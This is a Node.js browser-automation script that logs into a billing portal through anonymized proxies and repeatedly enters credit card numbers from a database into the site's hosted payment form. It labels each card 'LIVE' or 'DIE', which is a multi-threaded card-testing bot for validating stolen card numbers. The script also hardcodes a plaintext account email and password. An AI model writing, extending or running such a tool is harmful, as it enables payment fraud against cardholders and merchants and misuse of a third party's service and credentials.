const fs = require('fs');
const colors = require('colors');
const proxyChain = require('proxy-chain');

const { lauchFirefox } = require('./src/firefox');
const { counStock, updateAccount, insertResultCCN, getOneCCN } = require('./src/db.js');
const { sleep, getRandomInt, print } = require('./src/helper.js');
const config = require('./config/config.json');

(async () => {
  for (i = 1; i <= config.threads; i++) {
    const threadID = i
    loop(threadID)
    await sleep(35000)
  }
})();

async function loop(threadID) {

  const { page, browser, proxyServerURL } = await lauchFirefox('https://jccsfcommunity.force.com/s/login/');

  const email_input = await page.waitForXPath(`/html/body/div[3]/div[2]/div/div[2]/div[2]/div/div[2]/div/div[1]/div/input`, { timeout: 30000 })
  const password_input = await page.waitForXPath(`/html/body/div[3]/div[2]/div/div[2]/div[2]/div/div[2]/div/div[2]/div/input`, { timeout: 30000 })
  const submit_button = await page.waitForXPath(`/html/body/div[3]/div[2]/div/div[2]/div[2]/div/div[2]/div/div[3]/button`, { timeout: 30000 })

  await email_input.type('pusherdaemon@gmail.com')
  await password_input.type('2082001Tr@')
  await sleep(2500)
  await submit_button.click()

  await sleep(10000)

  page.goto('https://jccsfcommunity.force.com/s/billing', {
    waitUntil: 'load',
    timeout: 0
  });

  try {
    var result = await process(threadID, page, browser)
  } catch (error) {
    print(threadID, 'red', `ERROR STILL NOT FIX ( ${error} )`)
  }






  if (result == false) {
    //await proxyChain.closeAnonymizedProxy(proxyServerURL, true);
    await browser.close()

    //continue
  } else if (result == true) {


    await proxyChain.closeAnonymizedProxy(proxyServerURL, true);
    await browser.close()

    //continue
  }
}


async function process(threadID, page, browser) {
  while (true) {
    const newstore_button = await page.waitForXPath(`/html/body/div[3]/div[2]/div/div[2]/div/div[2]/div[3]/div/div[2]/div[2]/div[1]/div/div[1]/div/div/div[1]/div[2]/button`, { timeout: 30000 })
    await newstore_button.click()

    const accnickname_input = await page.waitForXPath(`//input[@name="accNickname"]`, { timeout: 30000 })
    await accnickname_input.type('Pusher Daemon')

    const creditcard_button = await page.waitForXPath(`/html/body/div[3]/div[2]/div/div[2]/div/div[2]/div[3]/div/div[2]/div[2]/div[3]/section/div/div/div/div/div[2]/div/div[2]/div/div[1]/div/div/div[2]/div[2]/div/div/button[1]`, { timeout: 30000 })
    await creditcard_button.click()

    const next_button = await page.waitForXPath(`//*[@id="ServiceCommunityTemplate"]/div[2]/div/div[2]/div/div[2]/div[3]/div/div[2]/div[2]/div[3]/section/div/div/div/div/div[2]/div/div[2]/div/div[2]/button[2]`, { timeout: 30000 })
    await next_button.click()

    await sleep(5000)
    const src = await page.$$eval('iframe[src]', imgs => imgs.map(img => img.getAttribute('src')));

    src.forEach(element => {
      if (element.includes('transaction.hostedpayments.com/?TransactionSetupID')) {
        page.goto(element, {
          waitUntil: 'load',
          timeout: 0
        });
      }
    });
    
    await inputCC(threadID, page, browser)

    page.goto('https://jccsfcommunity.force.com/s/billing', {
      waitUntil: 'load',
      timeout: 0
    });

    await sleep(5000)
  }
}

async function inputCC(threadID, page, browser) {

  await sleep(5000)
  
  while (true) {
    let value = await getOneCCN()

    const cardNumber = await page.waitForXPath(`//*[@id="cardNumber"]`, { timeout: 30000 })
    const submit = await page.waitForXPath(`//*[@id="submit"]`, { timeout: 30000 })

    await cardNumber.click({clickCount: 3})
    await cardNumber.type(value.bin)

    await page.select('#ddlExpirationMonth', value.month)
    await page.select('#ddlExpirationYear', value.year.slice(value.year.length-2, value.length))


    await sleep(1000)
    await submit.click()

    let result = await getResultCC(threadID, page, browser)

    switch (result) {
      case true:
        print(threadID, 'green', `LIVE |${value.bin}|${value.month}|${value.year}`)
        await insertResultCCN(value, true)
        return
      case false:
        print(threadID, 'red', `DIE |${value.bin}|${value.month}|${value.year}`)
        await insertResultCCN(value, false)
        await sleep(5000)
        continue
      case 'STOP':
        await insertResultCCN(value, 'fresh')
        return
    }
  }
  return

}


async function getResultCC(threadID, page, browser) {
  try {
    await sleep(3000)
    await page.waitForXPath(`//span[@class="error"]`, { timeout: 5000 })
    const element = await page.$('span.error');
    const text = await (await element.getProperty('textContent')).jsonValue();

    if (text.includes('TransactionSetupID')) {
      return 'STOP'
    }

    if (text.includes('Error')) {
      return false
    }  

  } catch (error) {
    return true
  }
}